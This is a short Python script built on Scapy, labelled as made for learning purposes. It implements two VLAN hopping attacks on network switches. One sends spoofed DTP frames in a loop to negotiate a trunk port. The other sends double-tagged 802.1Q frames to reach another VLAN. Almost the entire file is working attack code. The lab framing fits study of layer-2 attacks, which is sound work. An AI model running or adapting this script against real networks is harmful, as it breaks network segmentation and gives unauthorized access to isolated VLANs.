
"""
MADE BY MOBO, FOR LEARNING PURPOSES. T2R0I1

"""

from scapy.all import *
from scapy.contrib.dtp import *
import time

class VLAN_HOPPING():

  def __init__(self) :
      self.hello = "hello"
      self.run = True

  def EXECUTE_LAB(self):
      try : 
        while(self.run) : 
          self.switch_spoofing()
          time.sleep(10)

      except KeyboardInterrupt :
        print("\n [-] CTRL + C Detected .... Quitting  \n ")
        print("\n [+] Made by : MOBO [+] \n ")

  def switch_spoofing(self):
      # packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255") / ICMP()
      mac_my = "19:99:08:21:02:01"
      dtp_frame = Dot3(dst="01:00:0c:cc:cc:cc",src=mac_my) / LLC() / SNAP() 
      dtp_frame /= DTP(tlvlist=[DTPDomain(), DTPStatus(status="3"), DTPType(), DTPNeighbor(neighbor=mac_my)])
      srp(dtp_frame,timeout=0,verbose=False)

      

  def double_taggin(self):
      srp(Ether(dst="ca:01:e1:a4:00:08") / Dot1Q(vlan=1) / Dot1Q(vlan=10)  / IP(dst="172.16.0.1") / ICMP(),verbose=False,timeout=0)


X = VLAN_HOPPING()
# X.EXECUTE_LAB()